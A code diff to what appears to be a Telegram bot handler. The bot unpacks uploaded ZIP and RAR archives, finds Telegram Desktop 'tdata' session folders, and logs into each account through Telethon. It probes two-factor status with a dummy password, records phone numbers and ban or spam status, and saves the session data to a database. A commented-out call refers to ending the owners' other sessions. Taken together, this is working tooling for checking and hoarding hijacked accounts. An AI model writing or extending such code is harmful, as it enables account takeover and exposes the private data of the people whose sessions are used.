@@ -183,87 +183,105 @@ async def handle_archive(client, message):
     tempdir = tempfile.mkdtemp()
     results = []
     try:
+        await message.reply("🟢 Step 1: Starting processing...")
+
         # --- Step 1: Download
-        await message.reply("📥 Downloading file...")
-        file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
-        await message.reply(f"✅ File downloaded: `{file_path}`")
+        await message.reply("📥 Step 1.1: Downloading file...")
+        try:
+            file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
+            await message.reply(f"✅ Step 1.2: File downloaded to `{file_path}`")
+        except Exception as e:
+            return await message.reply(f"❌ Step 1 (Download) failed: {e}")
 
         extract_dir = os.path.join(tempdir, "extracted")
         os.makedirs(extract_dir, exist_ok=True)
 
-        # --- Step 2: Try extracting as ZIP or RAR
+        # --- Step 2: Extraction
+        await message.reply("📦 Step 2.1: Trying to extract archive...")
         try:
             with zipfile.ZipFile(file_path, "r") as zip_ref:
                 zip_ref.extractall(extract_dir)
-            await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")
+            await message.reply(f"✅ Step 2.2: ZIP extracted to `{extract_dir}`")
         except Exception as e_zip:
             try:
                 with rarfile.RarFile(file_path, "r") as rar_ref:
                     rar_ref.extractall(extract_dir)
-                await message.reply(f"📦 RAR extracted to: `{extract_dir}`")
+                await message.reply(f"✅ Step 2.3: RAR extracted to `{extract_dir}`")
             except Exception as e_rar:
                 return await message.reply(
-                    f"❌ Not a valid ZIP or RAR.\n"
+                    f"❌ Step 2 (Extraction) failed.\n"
                     f"ZIP error: {e_zip}\nRAR error: {e_rar}"
                 )
 
-        # --- Step 3: Find tdata folders
+        # --- Step 3: Detect tdata
+        await message.reply("🔍 Step 3: Searching for `tdata` folders...")
         tdata_paths = []
-        for root, dirs, files in os.walk(extract_dir):
-            # --- Old style: tdata/0 or tdata/1
-            if os.path.basename(root) == "tdata":
-                for d in dirs:
-                    if d in ("0", "1"):  # old tdata session folders
-                        tdata_paths.append(os.path.join(root, d))
+        try:
+            for root, dirs, files in os.walk(extract_dir):
+                # Old style tdata/0 or tdata/1
+                if os.path.basename(root) == "tdata":
+                    for d in dirs:
+                        if d in ("0", "1"):
+                            await message.reply(f"🔎 Found old-style tdata: {d}")
+                            tdata_paths.append(os.path.join(root, d))
 
-                # --- New style: tdata/D877F... with "maps"
-                for d in dirs:
-                    inner = os.path.join(root, d)
-                    if os.path.isdir(inner) and os.path.exists(os.path.join(inner, "maps")):
-                        tdata_paths.append(inner)
+                    # New style: D877F... with "maps"
+                    for d in dirs:
+                        inner = os.path.join(root, d)
+                        if os.path.isdir(inner) and os.path.exists(os.path.join(inner, "maps")):
+                            await message.reply(f"🔎 Found new-style tdata: {inner}")
+                            tdata_paths.append(inner)
 
-            # --- Edge case: archive directly contains D877F... folder
-            if os.path.basename(root).startswith("D877F") and "maps" in files:
-                tdata_paths.append(root)
+                # Edge case: archive directly contains D877F... folder
+                if os.path.basename(root).startswith("D877F") and "maps" in files:
+                    await message.reply(f"🔎 Found direct D877F folder: {root}")
+                    tdata_paths.append(root)
 
-            # --- Inner RAR handling (unchanged)
-            for f in files:
-                if f.lower().endswith(".rar"):
-                    rar_path = os.path.join(root, f)
-                    try:
-                        rar_extract_dir = os.path.join(root, "rar_extracted")
-                        os.makedirs(rar_extract_dir, exist_ok=True)
-                        with rarfile.RarFile(rar_path, "r") as rf:
-                            rf.extractall(rar_extract_dir)
-                        for r2, d2, f2 in os.walk(rar_extract_dir):
-                            if "tdata" in d2:
-                                tdata_paths.append(os.path.join(r2, "tdata"))
-                    except Exception as e:
-                        results.append(f"⚠️ Failed to extract inner rar {f}: {e}")
+                # Inner RAR
+                for f in files:
+                    if f.lower().endswith(".rar"):
+                        rar_path = os.path.join(root, f)
+                        await message.reply(f"📂 Found inner RAR: {rar_path}")
+                        try:
+                            rar_extract_dir = os.path.join(root, "rar_extracted")
+                            os.makedirs(rar_extract_dir, exist_ok=True)
+                            with rarfile.RarFile(rar_path, "r") as rf:
+                                rf.extractall(rar_extract_dir)
+                            for r2, d2, f2 in os.walk(rar_extract_dir):
+                                if "tdata" in d2:
+                                    tdata_paths.append(os.path.join(r2, "tdata"))
+                                    await message.reply(f"🔎 Extracted inner RAR with tdata: {rar_extract_dir}")
+                        except Exception as e:
+                            results.append(f"⚠️ Failed to extract inner rar {f}: {e}")
+        except Exception as e:
+            return await message.reply(f"❌ Step 3 (Search tdata) failed: {e}")
 
         if not tdata_paths:
             return await message.reply("⚠️ No `tdata` folders detected in this archive.")
 
-        # --- Step 4: Try login with each tdata
+        # --- Step 4: Process tdata
         for idx, tdata_path in enumerate(tdata_paths, 1):
-            await message.reply(f"➡️ Processing tdata #{idx} at `{tdata_path}`")
+            await message.reply(f"➡️ Step 4.{idx}: Processing tdata at `{tdata_path}`")
             try:
                 tdesk = TDesktop(tdata_path)
                 if not tdesk.isLoaded():
                     results.append(f"#{idx} ⚠️ Failed to load (corrupted tdata)")
                     continue
+                await message.reply(f"✅ Loaded tdata #{idx}")
 
                 tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                 await tele_client.connect()
-               # syd = await terminate_all_other_sessions(tele_client)
-               # await message.reply(syd)
+                await message.reply(f"📡 Connected Telethon client for tdata #{idx}")
+
                 if not await tele_client.is_user_authorized():
                     results.append(f"#{idx} ⚠️ Not authorized (needs login / 2FA)")
+                    await message.reply(f"⚠️ tdata #{idx} not authorized")
                     continue
 
                 me = await tele_client.get_me()
+                await message.reply(f"👤 Logged in as {me.first_name or '?'} ({me.id})")
 
-                # --- Detect 2FA state
+                # 2FA check
                 twofa_state = "Unknown"
                 try:
                     await tele_client.sign_in(password="wrongpass")
@@ -273,8 +291,7 @@ async def handle_archive(client, message):
                 except Exception:
                     twofa_state = "2FA: Enabled but unlocked via tdata"
 
-                acc_num = idx
-
+                # Save clean zip
                 clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                 with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                     for root, dirs, files in os.walk(tdata_path):
@@ -283,7 +300,6 @@ async def handle_archive(client, message):
                             arcname = os.path.relpath(full_path, tdata_path)
                             zipf.write(full_path, arcname)
 
-                # --- Read ZIP bytes
                 with open(clean_zip_path, "rb") as f:
                     tdata_bytes = f.read()
 
@@ -292,9 +308,9 @@ async def handle_archive(client, message):
                     "phone": me.phone or "?",
                     "twofa": twofa_state,
                     "spam": getattr(me, "restricted", False),
-                    "account_num": acc_num,
+                    "account_num": idx,
                 }
-                await db.save_account(me.id, acc_num, info, tdata_bytes)
+                await db.save_account(me.id, idx, info, tdata_bytes)
 
                 results.append(
                     f"#{idx}\n"
@@ -305,15 +321,19 @@ async def handle_archive(client, message):
                 )
 
                 await tele_client.disconnect()
+                await message.reply(f"✅ Finished processing account #{idx}")
 
             except SessionPasswordNeededError:
                 results.append(f"#{idx} ❌ 2FA: Enabled (password required)")
+                await message.reply(f"❌ tdata #{idx}: Needs 2FA password")
             except PhoneNumberBannedError:
                 results.append(f"#{idx} 🚫 BANNED number")
+                await message.reply(f"🚫 tdata #{idx}: Banned account")
             except Exception as e:
                 results.append(f"#{idx} ❌ Error: {str(e)}")
+                await message.reply(f"❌ Error in Step 4.{idx}: {e}")
 
-        # --- Final report
+        # --- Final Report
         report_text = "📑 Final Report:\n\n" + "\n".join(results)
         report_path = os.path.join(tempdir, "report.txt")
         with open(report_path, "w") as f:
